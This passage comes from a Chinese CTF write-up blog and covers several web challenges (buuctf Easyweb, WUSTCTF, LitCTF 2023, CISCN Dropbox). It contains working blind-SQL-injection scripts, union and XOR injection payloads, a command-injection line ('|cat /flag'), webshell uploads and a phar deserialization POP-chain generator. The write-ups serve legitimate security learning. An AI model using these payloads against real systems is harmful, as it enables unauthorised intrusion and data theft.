four{\n  public function __destruct()\n  {\n    if ($this->neepu->neepuctf()){\n      $this->fin->NEEPUCTF1($this->rce,$this->rce1);\n    }\n\n  }\n  public function __wakeup(){\n    $this->key=false;\n  }\n}\nclass five{\n  public $finish;\n  private $name;\n\n  public function __get($name)\n  {\n    return $this->$name=$this->finish[$name];\n  }\n}\n\n$a=$_POST[\"neepu\"];\nif (isset($a)){\n  unserialize($a);\n}\n```\n\n做不出来 是在太菜了 里面有我不会的知识点  没有属性值是怎么pop的 好离谱 \n\n乖乖去刷ctfshow\n\n先放着吧\n\n之后再回来填坑 我是垃圾 呜呜呜 太菜了 菜的想死\n","tags":["ssti","PHP反序列化","flask框架"],"categories":["各赛事WP"]},{"title":"buuctf-84-[CISCN2019 总决赛 Day2 Web1]Easyweb","url":"/post/1e328461.html","content":"\n[CISCN2019 总决赛 Day2 Web1]Easyweb\n\n<!--more-->\n\n一个登录界面 查看源码发现图片是通过`/image.php?id=1`获取的 猜测这里应该是有sql注入的\n\n日常查看`/robots.txt`发现存在备份文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632411207-29709d15-5b2b-4537-8cea-b8cae315b8ec.png)\n\n查看`image.php.bak`\n\n```php\n<﻿?php\n  include \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\n发现存在sql注入\n\n```\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n```\n\n需要构造特殊的语句来注入\n\n`addslashes($id)` 先来看看addslashes()函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632796661-b60d58ce-2bd8-425b-9ee7-aaa233bc2066.png)\n\n它会在这些符号前添加反斜杠进行转义\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632822501-8d3aec4a-35e3-4af4-832e-f1426364e177.png)\n\n官方文档也提及了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632852036-00011032-8464-4663-8b00-dd4e173b64b6.png)\n\n如果使用不得当 就会出现安全问题\n\n再来看`$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);`\n\n看到`$id`存在一个替换操作\n\n我们可以构造 `$id=\\\\0`=>经过addslashes()=>`$id=\\\\\\\\0`=>str_replace()=>`$id=\\\\`(相当于一个反斜杠)\n\n则查询语句就会变为：`select * from images where id='\\\\' or path='{$path}'`\n\nid反斜杠转义了`'`使得`$id='\\\\' or path='`那么我们就可以在`$path`输入我们的注入语句\n\n接下来就是一个常规的二分法盲注\n\n脚本如下：\n\n```python\nimport requests\nimport time\nurl='http://3f7e38a8-5912-4127-be50-a4870ab3b5ad.node4.buuoj.cn:81/image.php'\nresult=''\nfor i in range(40):\n    low=31\n    high=127\n    mid=(low+high)//2\n    while low<=high:\n        payload={\n        \"id\":\"\\\\0\",\n        \"path\":\" or ascii(substr((select password from users),{},1))>{}#\".format(i,mid)}\n        #爆表: or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{} #\n        #爆字段: or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),{},1))>{} #\n        #爆数据: or ascii(substr((select password from users),{},1))>{} #\n        r = requests.get(url=url,params=payload)\n        if (\"JFIF\" in r.text):\n            low = mid + 1\n            mid=(low+high)//2\n        else:\n            high = mid - 1\n            mid=(low+high)//2\n    result+=chr(high+1)\n    print(result)\n    time.sleep(0.3)\n```\n\n需要注意这道题目用于查询的where单双引号都被waf了 需要bypass\n\n可以用16进制进行绕过 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633339285-638d2e1f-801c-4188-8087-aab736f8c00a.png)\n\n可以得到admin密码为：`027e3da10ae66606cef2`\n\n之后是一个文件上传 简单上传一个一句话木马\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633701281-14648259-464b-4663-8d4c-4641f64ea580.png)\n\n发现后php缀名都被过滤了 随便上传一个文件\n\n提示：`I logged the file name you uploaded to logs/upload.4f264cd65c72b60d3bd54f98a8189048.log.php. LOL`\n\n他将我们的文件名上传到这个php文件\n\n可以发现这个php文件记录了我们上传的文件名 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633906495-cb78c8e9-a772-4278-834b-278e0f00268d.png)\n\n既然这个记录文件自身就为php文件 可以执行php代码 那么我们就可以通过修改文件名为一句话木马 从而getshell\n\n这里他屏蔽了 php 用短标签bypass就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634219540-a5cb5f62-63a9-4446-9ea2-36e3f8e54d98.png)\n\n不知道为什么有时候上传上去的文件名🐎他不显示 但是可以运行 很奇怪可能是环境问题\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634365120-4e0455d5-7cdc-4ba0-b14e-0b92b9a7a146.png)\n","tags":["sql注入","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-67-[WUSTCTF2020]颜值成绩查询","url":"/post/4f323e41.html","content":"\n[WUSTCTF2020]颜值成绩查询\n\n<!--more-->\n\n一道经典的用if条件判断的二分法盲注题目 过滤了空格 用()嵌套或者/**/绕过就行了 其他还好\n\n复习一下二分法\n\n```python\nimport requests\nimport time\nurl = 'http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/'\nresult=''\nfor i in range(1,25):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = {\"stunum\":\"if(ascii(substr((select(value)from(ctf.flag)),{},1))>{},1,0)\".format(i,mid)}\n        #爆库：if(ascii(substr(database(),{},1))>{},1,0)\n        #爆表：if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{},1,0)\n        #爆字段：if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{},1,0)\n        #爆数据：if(ascii(substr((select(value)from(ctf.flag)),{},1))>{},1,0)\n        r = requests.get(url=url,params=paylaod)\n        if (\"admin\" in r.text):\n            low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    print(result)\n    time.sleep(0.3)\n```\n\n当然也可以用异或来注入\n\npayload：\n\n```python\n0^(ascii(substr(database(),1,1))>97) #爆库\n0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),1,1))>97)  #爆表\n0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),1,1))>97)  爆字段\n0^(ascii(substr((select(value)from(ctf.flag)),1,1))>97)  #爆数据\n```\n\n# \n","tags":["sql注入","sql bypass"],"categories":["buuctf"]},{"title":"LitCTF 2023 （公开赛道）WEB方向WP","url":"/post/d4be732.html","content":"\nLitCTF 2023（公开赛道）WEB方向WP\n\n<!--more-->\n\n整体web都很简单，这次也是第一次ak所有web题目，总排名50/1148，被实验室其他方向的👴带飞，keep on！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072731861-f783aba7-d561-4ec5-9c20-54d781cf52a8.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072940858-74566b6d-dc39-4dec-8464-fad26ec85492.png)\n\n# Web\n\n## 我Flag呢？（彩蛋一）\n\n查看源码爆flag\n\nF12 彩蛋，但是当时是通过翻源码翻出来的，麻了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684033668164-5d2df6ff-3ad1-4ede-b6ad-1d886d55d3be.png)\n\n```\nLitCTF{First_t0_The_k3y! (1/?)\n```\n\n## 导弹迷踪\n\n查看`game.js`源码 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037425180-3556324f-76ff-4d4b-97a6-a55708600309.png)\n\n## Follow me and hack me（彩蛋三）\n\n后来复现的时候才发现这道题把提交按钮ban了 当时做的时候直接用hackbar提交的 也是偷了一个一血:)\n\npayload: `?CTF=Lit2023`  然后post一个`challenge=i'm_c0m1ng`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034356003-a989e1f1-6d35-43c3-ab50-0d2e8cb88a0c.png)\n\n提示有备份文件 `/www.zip`下载一个源码 里面有彩蛋三\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034464808-7c54d155-8a9d-491a-8e96-1c3f34953e76.png)\n\n```\n_R3ady_Pl4yer_000ne_ (3/?)\n```\n\n## PHP是世界上最好的语言！！\n\n写个php代码就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034610396-b824eee6-a816-499c-b8be-41f084568a19.png)\n\n## Vim yyds\n\nvim 并且题目提示漏了 就想到是vim不正常退出导致的swp文件泄露 当时记得是在ctfshow刷题刷到的\n\n`.index.php.swp` 下载一个文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034859095-af36e824-ba42-4bb6-a80e-efeab4e86f97.png)\n\n然后这里看了大佬的wp 才知道 vim -r可以恢复源码 tql\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684248441738-52d569f2-6bcb-47a5-8fbb-e1c05b344685.png)\n\n```php\n<html>\n\n<head>\n    <meta charset=\"UTF-8\">\n    <style type=\"text/css\">\n        body,\n        html {\n            display: flex;\n            align-items: center;\n            justify-content: center;\n        }\n\n        div.vim {\n            display: flex;\n            align-content: center;\n            vertical-align: middle;\n            justify-content: center;\n        }\n\n        img {\n            border: none;\n            width: 8rem;\n            height: auto;\n        }\n\n        h1.vim_yyds {\n            color: #50f728;\n            display: flex;\n            align-items: flex-start;\n            justify-content: center;\n            margin-top: 50;\n            margin-left: 5px;\n        }\n\n        h3.vim_said {\n            color: #39c2ff;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n        }\n\n        br,\n        p {\n            font-size: 20;\n        }\n    </style>\n</head>\n\n<body>\n    <main>\n        <div class=\"vim\">\n            <img src=\"https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&pid=TechQna\"></img>\n            <h1 class=\"vim_yyds\">\n                Vim yyds\n            </h1>\n        </div>\n        <h3 class=\"vim_said\">\n            队里师傅说Vim是世界上最好的编辑器，不接受反驳\n        </h3>\n        <div class=\"can_can_vim\">\n            <?php\n            error_reporting(0);\n            $password = \"Give_Me_Your_Flag\";\n            echo \"<p>can can need Vim </p>\";\n            if ($_POST['password'] === base64_encode($password)) {\n                echo \"<p>Oh You got my password!</p>\";\n                eval(system($_POST['cmd']));\n            }\n            ?>\n        </div>\n    </main>\n</body>\n```\n\npost一个cmd命令执行 并且password要等与base64加密后的password 传参即可\n\n## 作业管理系统(彩蛋二)\n\n查看源码显示用户名密码都是admin\n\n然后上传一个一句话木马    `/木马`访问就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035114439-8aede763-cfc9-49f0-b85e-a884b143cb74.png)\n\n然后在这里能看到一个github链接 点进去就是第二个彩蛋  `_S0_ne3t? (2/?)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035147381-e408d351-3515-4d0e-80b4-9c75a70f25a0.png)\n\n## 这是什么？SQL ！注一下 ！（彩蛋四）\n\n这个题目真给自己无语住了 一开始用1，2都有正常回显 其他都没有回显 以为是盲注 注了半天还注出来了  发现里面没有flag表和字段 就感觉自己做错了\n\n回头看看 发现是简单的联合注入 真无语住了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035351491-b625f56a-6681-4d95-86fb-15c72d1cbae9.png)\n\n根据题目是sql语句闭合是`))))))`\n\npayload:\n\n爆数据库：\n\n```\n1)))))) union  select 1,group_concat(schema_name) from information_schema.schemata#\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\n爆表：\n\n```\n1)))))) union select 2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'#\nflag,news,users\n```\n\n爆字段：\n\n```\n1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#\nflag\n```\n\n爆数据：\n\n `1)))))) union select 1,flag from ctftraining.flag#`\n\n最后一个稍微有点坑 是我不了解的知识点 之前联合注入都是比如 `select flag from flag` 没有限定数据库\n\n导致当时做这道题目时候一直没注出来 麻了人\n\n这里要限定一下数据库然后再加上表名 `ctftraining.flag` 又学到了\n\n\n\n然后输入2 就是第四个彩蛋了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035939663-eeb7c294-4ece-44ca-bc2a-4307cf2595c8.png)\n\n```\nF1rst_to_Th3_eggggggggg!} (4/4)\n```\n\n## Http pro max plus\n\n`User-Agent: Chrome` 这里要把其他的删光只留这个 当时问了一下出题人\n\n```\nclient-ip: 127.0.0.1\nreferer: pornhub.com\n```\n\n`Via: Clash.win`这是我学到的新知识     Via头部列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036183348-620dc01a-1469-4042-bc7c-178bc11d707b.png)\n\n之后获得一个新路由\n\n```\n/wtfwtfwtfwtf.php\n```\n\n查看源码`/sejishikong.php` 获得flag\n\n\n\n## Ping\n\n发现除了127.0.0.1以外其他都会被拦截 并且是前端拦截 直接js禁用\n\n```\n127.0.0.1|cat /flag\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036599778-78cb6936-8433-497b-9f16-d17f2cf50026.png)\n\n## 1zjs\n\n这道题 我愿称之为我是终极眼瞎\n\n去翻了好多次源码 眼瞎没看到 甚至想过原型链污染  \n\n最后一次去看源码 一眼丁真 就藏在最开始的地方 我真该死\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036747062-88a40a10-6869-43f6-9d6e-c87a50cb22a5.png)\n\n访问 `/f@k3f1ag.php`获得一串jsfuck码\n\n在console中打入就能得到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036805391-53d257b5-636b-4015-8b98-88c2ce3351e4.png)\n\n## 彩蛋\n\n从上面题目各获取一部分 拼起来即可`NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}`\n\n## 就当无事发生\n\n感觉这道题目不是一个web题目 纯纯的社工题目\n\n找到github博客仓库 然后去看博客仓库分支的commit提交\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037606894-c0770701-9d8d-488a-8fa1-3c7a7561dc65.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037619054-3eb302ae-5d2c-4ef8-9799-c962b8176c72.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037636268-0e531107-6615-480e-970b-9ec0d7e05150.png)\n\n\n\n## Flag点击就送！\n\n这题吧 不想说啥 一眼丁真就以为session伪造 但是没有给到具体的key的信息或者暗示 然后想过模板注入也都不是 甚至想到xss去获取admin session\n\n最后发现 key 就是 `LitCTF`  。。\n\n最后session伪造 访问`/flag`即可\n","tags":["flask session伪造","js","sql注入","vim"],"categories":["各赛事WP"]},{"title":"buuctf-76-[CISCN2019 华北赛区 Day1 Web1]Dropbox","url":"/post/fb6927e0.html","content":"\n[CISCN2019 华北赛区 Day1 Web1]Dropbox\n\n<!--more-->\n\n一道经典的phar 反序列化题目\n\n注册一个账号然后登录\n\n发现可以上传文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716402325-7c52d9d0-9c71-4709-ba00-3c1b57bc054f.png)\n\n一开始以为是上传木马 当然不可能 buu第三页的题目不可能这么简单\n\n然后下载我们上传上去的文件\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716516171-45a1f1e3-ceb9-45b2-8b61-098e3e6ff05b.png)\n\n发现通过/download 请求了`filename=`来实现下载\n\n这里存在文件任意读漏洞\n\n构造`paylaod:filename=../../文件`可以得到很多源码\n\n共能下到7个php文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716726355-fa8d5653-be99-429d-9775-279dbf7347d9.png)\n\n接下来就是漫长的代码审计了\n\n## 审计：\n\n首先 login.php与register.php都是很常规的初处理 不多说\n\n然后是uplaod.php也是一些常规的检查上传文件合法与否的语句\n\n```php\nuplaod.php\n<?php\n  session_start();\nif (!isset($_SESSION['login'])) {\n  header(\"Location: login.php\");\n  die();\n}\n\ninclude \"class.php\";\n\nif (isset($_FILES[\"file\"])) {\n  $filename = $_FILES[\"file\"][\"name\"];\n  $pos = strrpos($filename, \".\");\n  if ($pos !== false) {\n    $filename = substr($filename, 0, $pos);\n  }\n\n  $fileext = \".gif\";\n  switch ($_FILES[\"file\"][\"type\"]) {\n    case 'image/gif':\n    $fileext = \".gif\";\n    break;\n    case 'image/jpeg':\n    $fileext = \".jpg\";\n    break;\n    case 'image/png':\n    $fileext = \".png\";\n    break;\n    default:\n    $response = array(\"success\" => false, \"error\" => \"Only gif/jpg/png allowed\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n    die();\n  }\n\n  if (strlen($filename) < 40 && strlen($filename) !== 0) {\n    $dst = $_SESSION['sandbox'] . $filename . $fileext;\n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $dst);\n    $response = array(\"success\" => true, \"error\" => \"\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n  } else {\n    $response = array(\"success\" => false, \"error\" => \"Invaild filename\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n  }\n}\n  ?>\n```\n\ndownload.php与delete.php一起看吧\n\n```php\ndownload.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\ndelete.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename)) {\n    $file->detele();\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => true, \"error\" => \"\");\n    echo json_encode($response);\n} else {\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => false, \"error\" => \"File not exist\");\n    echo json_encode($response);\n}\n?>\n```\n\n不管是删除还是下载路由都有`$file = new File();`\n\n跟踪一下 到class.php 也是最重要的\n\n```php\nclass.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass \n  {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func(); #file=new File()  func=close\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n```\n\nFile类中发现了`file_get_contents()`如果能调用 则可以文件包含\n\n可以构造`User->db(__destruct)->File->close()`来触发 但是读到的文件不能输出 \n\n发现还有一个类FileList 中有一个魔术方法 其实一般有魔术方法的类 都会去找能不能构造pop链条\n\n既然之前构造的链条没法回显 那么我们就要通过构造别的链条来使得回显\n\n`User->db(__destruct)->Filelist->__call->File->close()`再通过File函数的析构函数来回显\n\n```php\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func(); #file=new File()  func=close\n        }\n    }\n```\n\n当对象调用一个不存在的方法时，就会调用__call方法\n\n并且默认`$func`为不存在函数名 `$args`为参数 并且以数组形式\n\n用一个简单的demo来看看\n\n```php\n<?php\nclass student{\n    public $name;\n    public $age = 13;\n    public function __destruct() {\n        $this->name->close($this->age);\n    }\n}\nclass lunch{\n    public function __call($func, $args) {\n        echo $func;\n        echo \"\\n\";\n        var_dump($args);\n    }\n}\n$a = new student();\n$a->name=new lunch();\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683725787472-68c9314f-0d45-4d69-80d1-1c6c2284da57.png)\n\n整个魔术方法__call达到的效果就是将文件包含的结果传递给$this->results二维数组  好让析构函数输出\n\n那么这里__call方法是怎么做到的呢 一开始一直不明白这里的原理 看了好多wp 都没有提及 纯属是我太菜了 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683726874036-46a75869-468b-4c9d-833c-8651d7963247.png)\n\n```\n$this->results[$file->name()][$func] = $file->$func();\n```\n\n$file其实就是我们要去构造的File对象 $func是返回的close函数名 上面的demo中也提到了\n\n所以这里就等价为`File->close`是这样调用的\n\n其析构函数可以将返回的结果返回\n\n```php\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n```\n\n稍微审计一下其实就是把result数组结果赋值给`$table` 然后`echo $table;`输出\n\n明白了整个链子 应该怎么构造呢 题目只容许我们上传一个文件 不像我们平常做的pop链 去赋值给一个变量让其反序列化\n\n## Typo3 反序列化漏洞\n\n该漏洞由phar://触发\n\n可以直接去看大佬的总结：\n\nhttps://xz.aliyun.com/t/2715#toc-8\n\n[https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://kylingit.com/blog/由phpggc理解php反序列化漏洞/)\n\n说说我自己的看法\n\n首先我们的phar文件能够上传到对方服务器上 并且有相应的魔术方法作为踏板 而且`/ phar://` 不能被转义\n\nphar是php的压缩文件并且不经过解压就能直接被php访问并且执行\n\nphar结构由四部分组成：\n\n- stub phar 文件标识，格式为 `xxx<?php xxx; __HALT_COMPILER();?>`；\n- manifest 压缩文件的属性等信息，以**序列化**存储；\n- contents 压缩文件的内容；\n- signature 签名，放在文件末尾；\n\n构造固定内容为：\n\n```php\n//phar生成代码\n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata($a); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n```\n\n我们将构造的恶意pop链塞入`$phar->setMetadata();`中 ,并且存储形式为序列化字符串形式存储\n\n通过winhex查看一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816275551-e8b892a0-9df4-4fc8-ab6b-18c0b8d4175c.png)\n\n当我们通过`phar://`去访问该文件时 我们构造的恶意序列化pop链就会被反序列化 从而执行恶意代码\n\n明白了原理之后 直接构造\n\n```php\n<?php\nclass User {\n    public $db;\n}\n\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n\n    public function __construct() {\n        $this->results = array();\n        $this->funcs = array();\n        $file = new File();\n        $this->files = array($file);\n}\n}\nclass File {\n    public $filename='/flag.txt';\n}\n$a = new User();\n$a->db=new FileList();\n//phar生成代码\n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata($a); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n?>\n```\n\n然后这个flag路径是怎么推测出来的 其实题目也有暗喻 在download.php 不过如果我做这道题目肯定会当个瞎子\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816525788-9a226973-ff05-44f0-8c1a-3a8f69c96fe3.png)\n\n将我们生成的`Z1d10t.phar`改为`Z1d10t.png`上传上去这个后缀名并不会因为被修改而影响 猜测就像那个yaml反序列化题目一样 是通过二进制文件读取的 所以后缀无所谓\n\n然后这里访问也有个坑  我们可以通过download.php 下载访问 或者 delete.php 删除访问\n\n如果我们通过下载页面访问是不行的 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816750074-5e4f2216-b78b-406e-b1db-6769b1619212.png)\n\ndownload.php中有这么一串代码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816798255-1e9ab852-3d82-442f-a515-bde701d1239e.png)\n\nPHP 